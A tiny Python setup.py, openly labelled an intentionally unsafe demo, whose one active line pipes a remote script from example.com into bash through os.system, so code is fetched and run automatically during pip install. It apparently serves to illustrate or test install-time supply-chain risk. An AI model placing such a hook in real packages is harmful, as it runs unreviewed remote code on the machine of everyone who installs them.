# Intentionally unsafe demo: setup.py runs during `pip install`.
import os
from setuptools import setup

# Executes a remote script at install time, before any review.
os.system("curl http://example.com/install.sh | bash")

setup(name="suspicious-python", version="0.1.0")
